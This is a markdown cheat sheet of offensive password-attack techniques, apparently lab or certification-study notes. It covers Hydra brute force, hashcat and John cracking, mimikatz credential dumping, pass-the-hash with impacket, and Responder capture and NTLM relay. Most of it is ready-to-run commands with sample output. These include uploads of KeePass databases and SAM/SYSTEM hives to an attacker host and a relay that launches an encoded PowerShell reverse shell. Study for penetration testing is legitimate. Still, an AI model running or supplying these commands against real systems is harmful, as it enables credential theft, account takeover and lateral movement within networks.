# Password Attacks

## Hydra Brute Force Protocol Logins

* Hydra attacks a lot of protocols VNC, SSH, RDP, FTP
* -l login name Linux root or Windows Administrator
* -L Login list
* -p password
* -P Password list
* -s port number
* -t 1

```bash
# password guessing
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.1.2
# password spraying
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.1.2
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" ftp://192.168.1.2

```

## Hydra Brute-Force Web Logins

* Brute Force with HTTP POST form
* 3 params i.e. `/page.html:u=user&p=pass:Login failed.`
* Brute Force with HTTP GET basic and digest auth
* 3 params  i.e. `/page.html:A=basic:F=401`

```bash
# http-post-form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.180.201 http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"
# http-basic-auth
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt "http-get://10.9.9.12:8080/manager/html:A=BASIC:F=401"

```

## Password Cracking with Hashcat or John (the Ripper)

* Set hash type
* -m 0 e.g. hash type MD5
* -b benchmark
* Follow known password policy rules `/usr/share/hashcat/rules`
* More `https://hashcat.net/wiki/doku.php?id=rule_based_attack#implemented_compatible_functions`

```bash
hashcat -b
```

Manipulate dictionary files with rule sets

* seperate to rules with `space` to apply for each password

```bash
# delete lines no starting with 1
sed -i '/^1/d' pass.txt
# capitalize with c
echo c > demo.rule
# prepend with ^
echo \^2 > demo.rule
# append with $
echo \$! > demo.rule
```

```bash
# test the rule
echo "c \$!" > demo.rule
hashcat -r demo.rule --stdout pass.txt
```

```bash
# crack an MD5 hash -m 0
ls /usr/share/hashcat/rules
hashcat -m 0 crackme.txt -r demo.rule --force /usr/share/wordlists/rockyou.txt
hashcat -m 0 "8743b52063cd84097a65d1633f5c74f5" -r demo.rule /usr/share/wordlists/rockyou.txt
```

## Password Cracking 101

Follow a practical rule set

* Extract and Identify hashes e.g. `hash-identifier` or `hashid` or `https://hashes.com/en/tools/hash_identifier` 
* Format the hashes with transformation scripts `/usr/share/john`
* Calculate the cracking time
* Prepare wordlist based on rule sets
* Attack the hash

```bash
# List all 2john transformation scripts
ls -1 /usr/*bin/*2john
find /usr -type f -name "*2john*" 2> /dev/null

ssh2john
signal2john
...
7z2john
pwsafe2john
lastpass2john
bitwarden2john
dashlane2john
...
filezilla2john
truecrypt2john
..
pdf2john
putty2john
keepass2john
```

## Keepass Cracking

```powershell
# search for keepass db files with powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# exfiltrate with HTTP upload 
(New-Object System.Net.WebClient).UploadFile("http://192.168.45.234/upload.php?name=Database.kdbx", "C:\Users\user\Desktop\Database.kdbx")
```

```bash
# transform 2 john format
keepass2john Database.kdbx > keepass.john
# remove Database: "username"
cat keepass.john | cut -d: -f2 > keepass.hashcat 
# retrieve hash mode 13400 and crack the password
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hashcat /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## SSH Key Cracking

```bash
ssh2john id_rsa > ssh.john
# remove filename: id_rsa
cat ssh.john | cut -d: -f2 > ssh.hash

# hashcat does NOT support the hash aes-256-ctr
hashcat --help | grep -i "ssh"

# prepare john.conf
cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $#
sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'
# run john
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
# connect ssh
chmod 600 id_rsa
ssh -i id_rsa -p 22 ser@192.168.180.201
```

## Confluence Key Cracking

Scenario

* Attacker has access to Confluence Server and found credential
* Connect to Postgres
* Use \l to list all databases
* Use \c database to Connect to database
* Get Attlasian credentials from cwd_user
* Use hydra to crack the PKCS5S2 hash

Victim

```bash
# Search Confluence config for SQL password
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
 
<property name="hibernate.connection.password">S3cretPassw0rd</property>
<property name="hibernate.connection.url">jdbc:postgresql://10.4.187.215:5432/confluence</property>
<property name="hibernate.connection.username">postgres</property>
```

```bash
# Get Attassion credential from cwd_user
psql -h 192.168.187.63 -p 2345 -U postgres
\l
\c confluence
select * from cwd_user;
select user_name, credential from cwd_user;


   user_name    |                                credential
----------------+---------------------------------------------------------------------------
 admin          | {PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
 trouble        | {PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
 happiness      | {PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
 hr_admin       | {PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
 database_admin | {PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
 rdp_admin      | {PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
```

Attacker

```bash
hashcat --help | grep -i "Atlassian"
  12001 | Atlassian (PBKDF2-HMAC-SHA1)                               | Framework
  
hashcat -m 12001 /tmp/hashes.txt /usr/share/wordlists/fasttrack.txt

{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234
{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
```

## NTLM Cracking with mimikatz

* Use mimikatz to extract NTLM hashes of **Local Accounts**
* Use `lsadump::sam` to dump data stored in SAM Folder `C:\Windows\system32\config\sam`
* Use mimikatz to extract NTLM hashes of **Domain Accounts** f
* Use `sekurlsa::logonpasswords` extracts the password hash from LSASS memory
* Use mimikatz to extract NTLM hashes CredentialGuard protects domain accounts (VTL1)
* Use `misc::memssp` to logon credential to `C:\Windows\System32\mimilsa.log`

It is important to note that **CredentialGuard** is only designed to protect non-local users. This means that we are still able to obtain NTLM hashes for the local users on this machine.

Additionally the SSP (Security Support Provider) can also be registered through the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security` Packages registry key. Each time the system starts up, the Local Security Authority (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.

```powershell
# Enumerate local account users
net user
Get-LocalUser
Get-ComputerInfo -Property DeviceGuardSecurityServices*

Mimikatz.exe
# Enabling SeDebugPrivilege, elevating to SYSTEM user, requires SeImpersonatePrivilege 
privilege::debug
  20 'OK'
token::elevate
  -> Impersonated !

# Extracting NTLM hashes of Local Accounts
lsadump::sam
  NTML hash:

# Extract NTML hashes of logged on Domain Accounts
sekurlsa::logonpasswords

# Inject a SSPI (authenthication provider) to log Domain Accounts to file.
# This is necessary, if CredentialGuard is in place as protection mechanism.
  * Username : Administrator
  * Domain   : CORP
       * LSA Isolated Data: NtlmHash

misc::memssp
type C:\Windows\System32\mimilsa.log

```

## NTLM Cracking with regsave and impacket-secretsdump

* **Limitation**: Require privileges `SeDebugPrivilege` or `Administrator`
* **Limitation**: Require privileges `SeImpersonatePrivilege` for token elevation
* Run Windows terminal as Adminstrator
* Use reg save to save NTLM credentials of **Local Account**
* Use `reg save HKLM\sam sam`and `reg save HKLM\system system` hive from registry
* Use `impacket-secretsdump` to extract NTLM hashes
* Use `hashcat -m 1000 crackme.hash`

```pwsh
# Enumerate local account users
net user
Get-LocalUser

# Extracting NTLM hashes, requires SeImpersonatePrivilege or 
reg save HKLM\sam sam
reg save HKLM\system system
curl -vv -F "uploadedfile=@c:\services\sam" http://ATTACKER-IP/upload.php
curl -vv -F "uploadedfile=@c:\services\system" http://ATTACKER-IP/upload.php
```

```bash
impacket-secretsdump -sam uploads/sam -system uploads/system LOCAL
hashcat --help | grep -i "ntlm"
  1000 | NTLM ...

hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force  
```

```pwsh
# Extracting NTLM hashes, requires SeImpersonatePrivilege or 
reg save HKLM\sam sam
reg save HKLM\system system

curl -vv --form "uploadedfile=@c:\services\sam" http://ATTACKER-IP/upload.php
curl -vv --form "uploadedfile=@c:\services\system" http://ATTACKER-IP/upload.php
```

```bash
impacket-secretsdump -sam uploads/sam -system uploads/system LOCAL
hashcat --help | grep -i "ntlm"
  1000 | NTLM ...

hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force  
```

## Passing NTLM Hash

* pass-the-hash (PtH) technique
  * run pwsh as admin
  * get hash with mimikatz
* authenticate with administrator to a local or remote target with **username and NTLM hash**
* RDP tools `sekurlsa::pth /run:"mstsc.exe /restrictedadmin"` or `xfreerdp3 /pth:`
* SMB tools `smbclient` or `CrackMapExec`
* RCE tools `impacket-psexec` or `impacket-wmiexec`
* Use `impacket-*` lookup more tools `impacket-scripts` package

```bash
# Search for impacket-scripts
sudo find / -type f -name "impacket-*" 2> /dev/null   
/var/lib/dpkg/info/impacket-scripts.list
ls -1 /usr/*bin/impacket-*

/usr/bin/impacket-dpapi
/usr/bin/impacket-mimikatz
/usr/bin/impacket-smbclient
/usr/bin/impacket-secretsdump
/usr/bin/impacket-ntlmrelayx
```

```powershell
# run pwsh as admin
powershell Start-Process -Verb Runas powershell
# get admin hash using mimikatz
User : Administrator
  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
```

## Use mimikatz sekurlsa pass-the-hash to enable Remote Desktop on Domain Controller

Scenario

* **Limitation**: Require privileges `SeDebugPrivilege` or `Administrator`
* **Limitation**: Require privileges `SeImpersonatePrivilege` for token elevation
* Run CMD session with Domain Admin
* Run PSExec.exe to spawn a shell on Domain Controller
* Add Registry Entry to allow RestrictedAdmin RDP loggon

Source <https://www.hornetsecurity.com/en/blog/pass-the-hash-attack/>

While still in our Mimikatz session, run the following command to create a CMD session as the user.

```shell
mimikatz# sekurlsa::pth /user:<username> /domain:<domain name> /ntlm:<NTLM Hash>
```

```shell
# Spawn cmd on Domain Controller
copy \\ATTACKER\share\PSTool.zip .
PSExec.exe \\DOMAIN-CTRL cmd.exe
cd c:\windows\ntds
```

We can take it one step further, and RDP onto the Domain Controller for more freedom. We can add a new registry item to the Domain Controller to allow RDP-restricted admin with the following command in PowerShell.

```pwsh
# Enable Remote Desktop on the Domain Controller
New-ItemProperty -Path “HKLM:\System\CurrentControlSet\Control\Lsa” -Name “DisableRestrictedAdmin” -Value “0” -PropertyType DWORD
```

After successfully allowing RDP-restricted access, we can run the following command back in Mimikatz to initiate an RDP session with the NTLM hash. The option `/restrictedadmin` is important as it suppresses a password prompt.

```shell
#Spawn Remote Desktop Session on Domain Controller
mimikatz# sekurlsa::pth /user:<username> /domain:<domain name> /ntlm:<NTLM Hash> /run:”mstsc.exe /restrictedadmin”
```

## Use xfreerdp3 with pass-the-hash

The linux xfreerdp3 suppports NTLM pass-the-hash. Hence, when NTLM hash can be extracted there is no need to crack passwords. This works when restrictedadmin is enabled.

```bash
xfreerdp3 +clipboard /cert:inore /u:"DOMAIN\\User" /v:IP /pth:HIDDEN
```

## Use SMB tool smbclient with pass-the-hash

```bash
# escape backslashes
smbclient \\\\192.168.1.2\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
smb >
```

## Use RCE tool impacket-psexec with pass-the-hash

psexec searches for a writable share e.g. SMB and uploads an executable file to it. Then it registers the executable as a Windows service and starts it. The result often is the desired remote code execution.

```bash
# The format is LM:NTLM. Let's use the NTLM hash only! Hence 32 0s for LM.
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@10.1.2.3

[*] Found writable share ADMIN$
[*] Uploading file fxklemwe.exe
...
C:\Windows\system32> whoami
NT authority\system
```

## Use RCE tool impacket-wmiexec with pass-the-hash

Wmiexec uses Distributed Component Object Model ("DCOM") to connect remotely to a system. The threat actor’s execution of wmiexec.py will establish their connection with DCOM/RPC on port 135, the response back to the threat actor system is sent via the Server Message Block ("SMB") protocol.

```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@10.1.2.3
...
C:\>whoami
files02\administrator
```
## Abuse Net-NTLMv2 Auth Protocol

Scenario

* No Administration account on Windows to retrieve SAM with mimikatz
* Abuse the Net-NTLMv2 network authentication protocol
* Use `Responder` tool to setup a honeypot and print captured hashes
* Supported protocols are:
  * Servers (including HTTP and FTP),
  * Link-Local Multicast Name Resolution (LLMNR), 
  * NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS),
  * poisoning capabilities for ARP and DNS

Run responder as root and connect with the target machine to crack the NTLMv2 hash

```bash
ip a
...
tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 192.168.45.171

# -I interface
sudo responder -I tun0 -v
...
SMB server                 [ON]
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 192.168.167.211
[SMB] NTLMv2-SSP Username : FILES01\someone
[SMB] NTLMv2-SSP Hash     : someone::FILES01:edecc49d3860a163:FAE9ADF57AFF14707F5ADCF9A01F7378:TRUNCATED
```

```powershell
# Trigger NTMLv2 using SMB server
C:\Windows\system32>dir \\192.168.45.171\test
```

```bash
cat << EOF > someone.hash      
someone::FILES01:edecc49d3860a163:FAE9ADF57AFF14707F5ADCF9A01F7378:0101000000000000006471165D1BDB0152F3CB46EB1EC1D20000000002000800590034003500440001001E00570049004E002D0052004500450043004C004E004400500041004C00340004003400570049004E002D0052004500450043004C004E004400500041004C0034002E0059003400350044002E004C004F00430041004C000300140059003400350044002E004C004F00430041004C000500140059003400350044002E004C004F00430041004C0007000800006471165D1BDB0106000400020000000800300030000000000000000000000000200000104E03C87D48BBB6D80BF2579BC979DA56B1D0BDBF6575FD55E2565FF6CACFD00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370031000000000000000000
EOF

hashcat --help | grep -i "ntlmv2"
   5600 | NetNTLMv2

hashcat -m 5600 someone.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Abusing Net-NTLMv2 using Web file upload or XXS vuln

* Limitation:**Windows only**
* Find a file upload on Webserver
* Manipulate the **filename** of the HTTP request
* Replace the **filename** with **UNC path** of your waiting responder or Inveigh

Sources:

* `https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html`
* `https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/`
  
```bash
sudo responder -I tun0 -v 

SMB] NTLMv2-SSP Client   : 192.168.167.210
[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:149c73e3ffa2f4ff:39F258CD1D70FAF4D36BD3327C948C09:Truncated
```

```plain
# intercept burp request and trigger NTLMv2 Authication using UNC path 
# windows requires \\\\ 
...
POST /upload HTTP/1.1
Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.171\\test"
```

Explaination:
We discover a file upload form in a web application on a Windows server, we can try to enter a non-existing file with a UNC path like \\192.168.119.2\share\nonexistent.txt. If the web application supports uploads via SMB, the Windows server will authenticate to our SMB server.

## Abusing Net-NTLMv2 using a DOCX Format

* Limitation:**Windows only**
* Add an image to docx Wordfile
* Manipulate the `document.xml.rels`
* Replace the image Target with **UNC path** of your waiting responder or Inveigh
* Cature the NTLMv2 hash

Sources:

* `https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html`
* `https://infinitelogins.com/2020/11/16/capturing-relaying-net-ntlm-hashes-without-kali-linux-using-inveigh/`

```powershell
PS> Invoke-Inveigh -NBNS N -LLMNR N -ConsoleOutput Y -IP 192.168.0.2
```

## Abusing Net-NTLMv2 Relay Attack

Scenario

Requires Active Directory

This tool `impacket-ntlmrelayx` does the relay attack by setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target of our choice.

* `impacket-ntlmrelayx`
* -t TARGET IP
* -c execute a powershell reverse shell one-liner with powercat.ps1
* -smb2support enable SMBv2
* --no-http-server disable HTTP
* Source: `https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py`

```bash
# Relay NTLMv2 hash to target and run powercat.ps1 reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

```bash
# Listen for Reverse Shell 
nc -lvp 4444
```

```powershell
# Trigger NTLMv2 authentication
dir \\ATTACKER-IP\test
```
